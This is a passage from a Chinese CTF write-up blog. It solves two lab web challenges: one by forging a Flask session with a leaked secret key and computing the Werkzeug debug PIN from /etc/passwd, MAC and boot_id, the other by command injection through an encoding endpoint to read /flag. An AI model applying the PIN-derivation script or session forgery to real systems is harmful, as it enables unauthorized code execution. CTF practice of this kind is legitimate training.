class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_permissions</span>(<span class="params">file_path, username</span>):</span><br><span class="line">    <span class="comment"># 检查用户是否有权限访问特定文件或目录</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从 JSON 文件中读取用户信息</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user_data.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        user_data = json.load(f)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取用户的权限配置</span></span><br><span class="line">    user_permissions = user_data.get(username, &#123;&#125;).get(<span class="string">&#x27;permissions&#x27;</span>, &#123;&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查文件路径是否与用户权限配置中的某个路径匹配</span></span><br><span class="line">    <span class="keyword">for</span> permission_path <span class="keyword">in</span> user_permissions.keys():</span><br><span class="line">        <span class="keyword">if</span> file_path.startswith(permission_path):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/error&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> flag:</span><br><span class="line">        flag = flag.read()</span><br><span class="line">    <span class="keyword">assert</span> flag == <span class="string">&quot;dutctf&#123;Fak3_fl@g_2333&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 初始化用户数据文件</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(USER_DATA_FILE):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(USER_DATA_FILE, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            json.dump(&#123;&#125;, f)</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="string">&#x27;5000&#x27;</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>注意到<code>/update_permissions</code>有对管理员的身份进行检测，且开头处给出了secretkey，猜测有flask session伪造</p>
+<p>先decode</p>
+<p><img src="15.png" alt="15"></p>
+<p>根据提示，来到出题人的github中，找到相关题目的commit</p>
+<p><img src="image-20240325165122168.png" alt="image-20240325165122168"></p>
+<p>找到SECRET_KEY</p>
+<p>然后把相关权限改一下之后加密</p>
+<p><img src="image-20240325170051367.png" alt="image-20240325170051367"></p>
+<p>然后update permissions</p>
+<p>把根目录的读权限交给ctfer</p>
+<p><img src="image-20240325174306046.png" alt="image-20240325174306046"></p>
+<p>然后根据解pin码的需求找到6个相关的数据</p>
+<p>读取/etc/passwd</p>
+<p><img src="image-20240325174344172.png" alt="image-20240325174344172"></p>
+<p>flask登录的用户名是<code>root</code></p>
+<p>modname默认值为<code>flask.app</code></p>
+<p>appname默认值为<code>Flask</code></p>
+<p>moddir（flask下的绝对路径）可以通过报错界面来得知：<code>/usr/local/lib/python3.9/site-packages/flask/app.py</code></p>
+<p>网络mac可以通过<code>/sys/class/net/eth0/address</code>获得</p>
+<p><img src="image-20240325175106383.png" alt="image-20240325175106383"></p>
+<p>中间冒号去掉后得到的数转换为十进制就是我们需要的值：<code>2485376909319</code></p>
+<p>docker机器的id可以通过<code>/etc/machine-id</code>或者<code>/proc/sys/kernel/random/boot_id</code>得到：<code>c5391a8d-9aa2-4478-9b74-012e3e76e356</code></p>
+<p><img src="image-20240325175404256.png" alt="image-20240325175404256"></p>
+<p>六个值都得到了，现在来写脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.9/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485376909319&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c5391a8d-9aa2-4478-9b74-012e3e76e356&#x27;</span> <span class="comment"># 按道理来说这里是machine_id或者boot_id与/proc/self/cgroup，但我访问之后却发现是空，所以我直接把boot_id放上去了，不影响解题</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
+<p>解出pin码后应该就可以通过了</p>
+<p>读取flag</p>
+<p><img src="image-20240325180751124.png" alt="image-20240325180751124"></p>
+<h2><span id="weirdbash">WeirdBash</span></h2>
+<p>一个简单的编码系统，先看看能得出什么</p>
+<p><img src="7.png" alt="7"></p>
+<p>经过数次编码，推测是每个字母数字符号都有一个唯一的noob编码，组合起来的字符串在编码后变成每个字符编码连起来的形式</p>
+<p>尝试输入敏感命令，但都只是被编码，没有任何多余的操作</p>
+<p>考虑输入一些敏感信息，如flag，/etc/passwd等</p>
+<p>输入dutctf发现奇怪的编码</p>
+<p><img src="8.png" alt="8"></p>
+<p>猜测是一个含有敏感信息的语句</p>
+<p>这个可以一个个字符输出来作为对照表，也可以写脚本直接秒</p>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数用于发送POST请求并获取编码值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_encoded_value</span>(<span class="params">input_char</span>):</span><br><span class="line">    url = <span class="string">&quot;http://10.7.37.200:10166/encode&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;input_string&#x27;</span>: input_char&#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        encoded_value = soup.find(<span class="string">&#x27;pre&#x27;</span>).text  <span class="comment"># 根据实际返回的HTML结构调整</span></span><br><span class="line">        <span class="keyword">return</span> encoded_value</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ASCII字符范围从32到126</span></span><br><span class="line">start_ascii = <span class="number">32</span></span><br><span class="line">end_ascii = <span class="number">126</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出文件名</span></span><br><span class="line">output_file = <span class="string">&#x27;encoded_values.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_ascii, end_ascii + <span class="number">1</span>):</span><br><span class="line">        char = <span class="built_in">chr</span>(i)</span><br><span class="line">        encoded_value = get_encoded_value(char)</span><br><span class="line">        <span class="comment"># 格式化字符串，如 &quot;0 noob!noob?&quot;</span></span><br><span class="line">        output_line = <span class="string">f&quot;<span class="subst">&#123;char&#125;</span> <span class="subst">&#123;encoded_value&#125;</span>\n&quot;</span></span><br><span class="line">        file.write(output_line)</span><br><span class="line">        <span class="built_in">print</span>(output_line)  <span class="comment"># 在控制台输出</span></span><br></pre></td></tr></table></figure>
+<p>这句话大致意思就是让我们进入noob目录下面，有东西</p>
+<p>进入到noob目录下</p>
+<p><img src="9.png" alt="9"></p>
+<p>发现是noob解码，可以考虑将命令进行noob编码后再解码得到命令执行后的结果，<s>感觉跟序列化和反序列化的效果差不多</s></p>
+<p><img src="10.png" alt="10"></p>
+<p>（这里是ls编码之后的结果）</p>
+<p>之后cat /flag即可</p>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2024/03/20/buu/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">buu做题记录（1）</h2>
+        </a>
+      
+      <div class="card-text--row">Newer</div>
+    </div>
+  </article>
+</div>
+          
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+    <div class="valine-container comments-container content-padding--primary soft-size--large soft-style--box">
+      <div id="valine_thread" class="valine-thread"></div>
+    </div>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/leancloud-storage@3.15.0/dist/av-min.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script>
+    <script type="text/javascript">
+      new Valine({
+        el: "#valine_thread",
+        appId: "aVkLSx5WxYz0QVDh2Vo6bAfL-gzGzoHsz",
+        appKey: "Fr4YvenWWx1qOkxmdS2Vow7Z",
+        placeholder: "随便说点什么叭～",
+        avatar: "mp",
+        pageSize: 10,
+        lang: "zh-cn",
+        visitor: true,
+        recordIP: true,
+        enableQQ: true,
+        meta: ['nick', 'mail', 'link'],
+        requiredFields: ['nick'],
+        
+        // Bilibili 表情包插件
+        // 设置 Bilibili 表情包地址
+        emojiCDN: '//i0.hdslb.com/bfs/emote/', 
+        // 表情 title 和图片映射
+        emojiMaps: {
+            // 小黄脸
+            "2023": "fa6dda8b876ed38609de38aa604be5ad109b8591.png",
+            "足球": "f9157d9fa5ac3b8339cb8a8b7ad70eb40d4113c9.png",
+            "脱单doge": "bf7e00ecab02171f8461ee8cf439c73db9797748.png",
+            "微笑": "685612eadc33f6bc233776c6241813385844f182.png",
+            "口罩": "3ad2f66b151496d2a5fb0a8ea75f32265d778dd3.png",
+            "doge": "3087d273a78ccaff4bb1e9972e2ba2a7583c9f11.png",
+            "妙啊": "b4cb77159d58614a9b787b91b1cd22a81f383535.png",
+            "OK": "4683fd9ffc925fa6423110979d7dcac5eda297f4.png",
+            "星星眼": "63c9d1a31c0da745b61cdb35e0ecb28635675db2.png",
+            "辣眼睛": "35d62c496d1e4ea9e091243fa812866f5fecc101.png",
+            "吃瓜": "4191ce3c44c2b3df8fd97c33f85d3ab15f4f3c84.png",
+            "滑稽": "d15121545a99ac46774f1f4465b895fe2d1411c3.png",
+            "呲牙": "b5a5898491944a4268360f2e7a84623149672eb6.png",
+            "打call": "431432c43da3ee5aab5b0e4f8931953e649e9975.png",
+            "歪嘴": "4384050fbab0586259acdd170b510fe262f08a17.png",
+            "调皮": "8290b7308325e3179d2154327c85640af1528617.png",
+            "2022": "a783df2ce72952c44004007462324bde4b092a0c.png",
+            "虎年": "a062f5fa2bafe677e49b6963a2bbb11dd4fe1e11.png",
+            "豹富": "3d1dbe52ea16e12ff7b1c371196f728a4097fb33.png",
+            "嗑瓜子": "28a91da1685d90124cfeead74622e1ebb417c0eb.png",
+            "笑哭": "c3043ba94babf824dea03ce500d0e73763bf4f40.png",
+            "藏狐": "ba0937ef6f3ccca85e2e0047e6263f3b4da37201.png",
+            "脸红": "0922c375da40e6b69002bd89b858572f424dcfca.png",
+            "给心心": "1597302b98827463f5b75c7cac1f29ea6ce572c4.png",
+            "嘟嘟": "abd7404537d8162720ccbba9e0a8cdf75547e07a.png",
+            "哦呼": "362bded07ea5434886271d23fa25f5d85d8af06c.png",
+            "喜欢": "8a10a4d73a89f665feff3d46ca56e83dc68f9eb8.png",
+            "酸了": "92b1c8cbceea3ae0e8e32253ea414783e8ba7806.png",
+            "嫌弃": "de4c0783aaa60ec03de0a2b90858927bfad7154b.png",
+            "大哭": "2caafee2e5db4db72104650d87810cc2c123fc86.png",
+            "害羞": "9d2ec4e1fbd6cb1b4d12d2bbbdd124ccb83ddfda.png",
+            "疑惑": "b7840db4b1f9f4726b7cb23c0972720c1698d661.png",
+            "喜极而泣": "485a7e0c01c2d70707daae53bee4a9e2e31ef1ed.png",
+            "奸笑": "bb84906573472f0a84cebad1e9000eb6164a6f5a.png",
+            "笑": "81edf17314cea3b48674312b4364df44d5c01f17.png",
+            "偷笑": "6c49d226e76c42cd8002abc47b3112bc5a92f66a.png",
+            "惊讶": "f8e9a59cad52ae1a19622805696a35f0a0d853f3.png",
+            "捂脸": "6921bb43f0c634870b92f4a8ad41dada94a5296d.png",
+            "阴险": "ba8d5f8e7d136d59aab52c40fd3b8a43419eb03c.png",
+            "囧": "12e41d357a9807cc80ef1e1ed258127fcc791424.png",
+            "呆": "33ad6000d9f9f168a0976bc60937786f239e5d8c.png",
+            "抠鼻": "cb89184c97e3f6d50acfd7961c313ce50360d70f.png",
+            "大笑": "ca94ad1c7e6dac895eb5b33b7836b634c614d1c0.png",
+            "惊喜": "0afecaf3a3499479af946f29749e1a6c285b6f65.png",
+            "无语": "44667b7d9349957e903b1b62cb91fb9b13720f04.png",
+            "点赞": "1a67265993913f4c35d15a6028a30724e83e7d35.png",
+            "鼓掌": "895d1fc616b4b6c830cf96012880818c0e1de00d.png",
+            "尴尬": "cb321684ed5ce6eacdc2699092ab8fe7679e4fda.png",
+            "灵魂出窍": "43d3db7d97343c01b47e22cfabeca84b4251f35a.png",
+            "委屈": "d2f26cbdd6c96960320af03f5514c5b524990840.png",
+            "傲娇": "010540d0f61220a0db4922e4a679a1d8eca94f4e.png",
+            "疼": "905fd9a99ec316e353b9bd4ecd49a5f0a301eabf.png",
+            "冷": "cb0ebbd0668640f07ebfc0e03f7a18a8cd00b4ed.png",
+            "热": "4e58a2a6f5f1580ac33df2d2cf7ecad7d9ab3635.png",
+            "生病": "0f25ce04ae1d7baf98650986454c634f6612cb76.png",
+            "吓": "9c10c5ebc7bef27ec641b8a1877674e0c65fea5d.png",
+            "吐": "06946bfe71ac48a6078a0b662181bb5cad09decc.png",
+            "捂眼": "c5c6d6982e1e53e478daae554b239f2b227b172b.png",
+            "嘘声": "e64af664d20716e090f10411496998095f62f844.png",
+            "思考": "cfa9b7e89e4bfe04bbcd34ccb1b0df37f4fa905c.png",
+            "再见": "fc510306bae26c9aec7e287cdf201ded27b065b9.png",
+            "翻白眼": "eba54707c7168925b18f6f8b1f48d532fe08c2b1.png",
+            "哈欠": "888d877729cbec444ddbd1cf4c9af155a7a06086.png",
+            "奋斗": "bb2060c15dba7d3fd731c35079d1617f1afe3376.png",
+            "墨镜": "3a03aebfc06339d86a68c2d893303b46f4b85771.png",
+            "难过": "a651db36701610aa70a781fa98c07c9789b11543.png",
+            "撇嘴": "531863568e5668c5ac181d395508a0eeb1f0cda4.png",
+            "抓狂": "4c87afff88c22439c45b79e9d2035d21d5622eba.png",
+            "生气": "3195714219c4b582a4fb02033dd1519913d0246d.png",
+            "水稻": "d530fcaa5100ba12a17a79b55bad342d530c54e3.png",
+            "奶茶干杯": "d5a491990be551ce69f9660da948050df4eab331.png",
+            "汤圆": "93609633a9d194cf336687eb19c01dca95bde719.png",
+            "锦鲤": "643d6c19c8164ffd89e3e9cdf093cf5d773d979c.png",
+            "弹幕破百亿": "80891223ba023dff3141e377f4ea3b89918eb6a4.png",
+            "福到了": "5de5373d354c373cf1617b6b836f3a8d53c5a655.png",
+            "鸡腿": "c7860392815d345fa69c4f00ef18d67dccfbd574.png",
+            "雪花": "a41813c4edf8782047e172c884ebd4507ce5e449.png",
+            "视频卫星": "dce6fc7d6dfeafff01241924db60f8251cca5307.png",
+            "干杯": "8da12d5f55a2c7e9778dcc05b40571979fe208e6.png",
+            "黑洞": "e90ec4c799010f25391179118ccd9f66b3b279ba.png",
+            "爱心": "ed04066ea7124106d17ffcaf75600700e5442f5c.png",
+            "胜利": "b49fa9f4b1e7c3477918153b82c60b114d87347c.png",
+            "加油": "c7aaeacb21e107292d3bb053e5abde4a4459ed30.png",
+            "抱拳": "89516218158dbea18ab78e8873060bf95d33bbbe.png",
+            "响指": "1b5c53cf14336903e1d2ae3527ca380a1256a077.png",
+            "保佑": "fafe8d3de0dc139ebe995491d2dac458a865fb30.png",
+            "福": "802429a301ac5b35a0480d9526a070ce67cd8097.png",
+            "支持": "3c210366a5585706c09d4c686a9d942b39feeb50.png",
+            "拥抱": "41780a4254750cdaaccb20735730a36044e98ef3.png",
+            "跪了": "f2b3aee7e521de7799d4e3aa379b01be032698ac.png",
+            "怪我咯": "07cc6077f7f7d75b8d2c722dd9d9828a9fb9e46d.png",
+            "老鼠": "8e6fb491eb1bb0d5862e7ec8ccf9a3da12b6c155.png",
+            "牛年": "9275275ff1f2659310648221107d20bc4970f106.png",
+            "三星堆": "fc7dadaa6986e75b813aa26f3eff3281d5f1a6d1.png",
+            "洛天依": "9fe06f3594d9afaf4ee2b74770f1c3086ae0ba11.png",
+            "坎公骑冠剑_吃鸡": "c4248a7b6ab326d66c83fd1fb58f1a50f99df332.png",
+            "坎公骑冠剑_钻石": "0b97c7e50e0cc963370e62fbb9b55f51bbe7f8ab.png",
+            "坎公骑冠剑_无语": "80eba0ce64c3fc1279b4daede2f1979cb2380e78.png",
+            "来古-沉思": "4ee07ff03266d62b246be0b950bebb2abf3d997c.png",
+            "来古-呆滞": "9a70b365e523f2379f395031ceefcebb75a45903.png",
+            "来古-疑问": "032fdc0d9d9fe6334776f6c39518a959b73b98f4.png",
+            "来古-震撼": "8b40f228675602a317d32007de6b795c101135ec.png",
+            "来古-注意": "4b671ba32a2581cf40e5cd41c67b111eb8010de0.png",
+            "初音未来_大笑": "8e7f71cda83ce407b0684702983399f8ed982f17.png",
+            "原神_哇": "8188ddf95bace929d382c7a83214afde79d83bfc.png",
+            "原神_哼": "91ed33b74bc36873c3ac8b2648f70d7ab6d8ab78.png",
+            "原神_嗯": "8b0a87e414f453a29730b6e0f45ca61f2f898688.png",
+            "原神_欸嘿": "8fba438fcbe0550877b04efd768d857082307c5e.png",
+            "原神_喝茶": "1de5789fbb3526ef7823c54db7081790a38e7044.png",
+            "原神_生气": "90a38c34742899f8e84138ed55f56cad3ba611fb.png",
+            "保卫萝卜_白眼": "9fce63f38288700bf7be84f3be336cf895ba0902.png",
+            "保卫萝卜_笔芯": "5ff2ed5cb71b02010018cc5910ac7052a03769af.png",
+            "保卫萝卜_哭哭": "7d249f7c990111d3e2982f7477af15b7eb29cbd9.png",
+            "保卫萝卜_哇": "5f2370e561c32d841245f7b1aab2eef43aeb9544.png",
+            "保卫萝卜_问号": "41eb93f09fc4a4d0692a310e8a1f85ba60e96060.png",
+            "无悔华夏_不愧是你": "c58002c32ee78d45366e126f294cb3149dd64ac2.png",
+            "无悔华夏_吃瓜": "273dcff577551bafff4f1eae18561f871e73a6ba.png",
+            "无悔华夏_达咩": "cffab383f47bab7f6736ba9c8d6ac098113410d9.png",
+            "无悔华夏_点赞": "b0f2e8db405ec667c3e6aaabd7c15155b6ea8710.png",
+            "无悔华夏_好耶": "324cd79784aeb37dbf2f47f68bbe8ed5d01f975e.png",
+            "奥比岛_搬砖": "1fab697214918d91087373a999cc7ef8040ddf85.png",
+            "奥比岛_点赞": "fb0b476fe2ff30cd59385ea7d616627ac114161f.png",
+            "奥比岛_击爪": "35bba1bb8f164c5e844155548438248e6eaa8382.png",
+            "奥比岛_委屈": "fda155e7c33b40dbb94c24644e0635d47b6ef3cc.png",
+            "奥比岛_喜欢": "ed64e0c81ee194138bd9df30c65077ed978fb88c.png",
+            // tv_小电视
+            "tv_白眼": "c1d59f439e379ee50eef488bcb5e5378e5044ea4.png",
+            "tv_doge": "6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png",
+            "tv_坏笑": "1f0b87f731a671079842116e0991c91c2c88645a.png",
+            "tv_难过": "87f46748d3f142ebc6586ff58860d0e2fc8263ba.png",
+            "tv_生气": "26702dcafdab5e8225b43ffd23c94ac1ff932654.png",
+            "tv_委屈": "d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png",
+            "tv_斜眼笑": "911f987aa8bc1bee12d52aafe62bc41ef4474e6c.png",
+            "tv_呆": "fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png",
+            "tv_发怒": "34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png",
+            "tv_惊吓": "0d15c7e2ee58e935adc6a7193ee042388adc22af.png",
+            "tv_呕吐": "9f996894a39e282ccf5e66856af49483f81870f3.png",
+            "tv_思考": "90cf159733e558137ed20aa04d09964436f618a1.png",
+            "tv_微笑": "70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png",
+            "tv_疑问": "0793d949b18d7be716078349c202c15ff166f314.png",
+            "tv_大哭": "23269aeb35f99daee28dda129676f6e9ea87934f.png",
+            "tv_鼓掌": "1d21793f96ef4e6f48b23e53e3b9e42da833a0f6.png",
+            "tv_抠鼻": "c666f55e88d471e51bbd9fab9bb308110824a6eb.png",
+            "tv_亲亲": "a8111ad55953ef5e3be3327ef94eb4a39d535d06.png",
+            "tv_调皮": "b9c41de8e82dd7a8515ae5e3cb63e898bf245186.png",
+            "tv_笑哭": "1abc628f6d4f4caf9d0e7800878f4697abbc8273.png",
+            "tv_晕": "5443c22b4d07fb1907ccc610c8e6db254f2461b7.png",
+            "tv_点赞": "f85c354995bd99e28fc76c869bfe42ba6438eff4.png",
+            "tv_害羞": "a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png",
+            "tv_睡着": "8b196675b53af58264f383c50ad0945048290b33.png",
+            "tv_色": "61822c7e9aae5da76475e7892534545336b23a6f.png",
+            "tv_吐血": "09dd16a7aa59b77baa1155d47484409624470c77.png",
+            "tv_无奈": "ea8ed89ee9878f2fece2dda0ea8a5dbfe21b5751.png",
+            "tv_再见": "180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png",
+            "tv_流汗": "cead1c351ab8d79e9f369605beb90148db0fbed3.png",
+            "tv_偷笑": "bb690d4107620f1c15cff29509db529a73aee261.png",
+            "tv_抓狂": "fe31c08edad661d63762b04e17b8d5ae3c71a757.png",
+            "tv_黑人问号": "45821a01f51bc867da9edbaa2e070410819a95b2.png",
+            "tv_困": "241ee304e44c0af029adceb294399391e4737ef2.png",
+            "tv_打脸": "56ab10b624063e966bfcb76ea5dc4794d87dfd47.png",
+            "tv_闭嘴": "c9e990da7f6e93975e25fd8b70e2e290aa4086ef.png",
+            "tv_鄙视": "6e72339f346a692a495b123174b49e4e8e781303.png",
+            "tv_腼腆": "89712c0d4af73e67f89e35cbc518420380a7f6f4.png",
+            "tv_馋": "fc7e829b845c43c623c8b490ee3602b7f0e76a31.png",
+            "tv_可爱": "9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png",
+            "tv_发财": "34db290afd2963723c6eb3c4560667db7253a21a.png",
+            "tv_生病": "8b0ec90e6b86771092a498c54f09fc94621c1900.png",
+            "tv_流鼻血": "c32d39db2737f89b904ca32700d140a9241b0767.png",
+            "tv_尴尬": "7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png",
+            "tv_大佬": "093c1e2c490161aca397afc45573c877cdead616.png",
+            "tv_流泪": "7e71cde7858f0cd50d74b0264aa26db612a8a167.png",
+            "tv_冷漠": "b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png",
+            "tv_皱眉": "72ccad6679fea0d14cce648b4d818e09b8ffea2d.png",
+            "tv_鬼脸": "0ffbbddf8a94d124ca2f54b360bbc04feb6bbfea.png",
+            "tv_调侃": "4bc022533ef31544ca0d72c12c808cf4a1cce3e3.png",
+            "tv_目瞪口呆": "0b8cb81a68de5d5365212c99375e7ace3e7891b7.png",
+            // ... 更多表情
+        }
+        
+      });
+    </script>
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="/profile.png" class="soft-size--round soft-style--box" alt="Ins0mn1a">
+    
+    
+      <h2>Ins0mn1a</h2>
+    
+    
+      <p>想睡个好觉zzz......</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 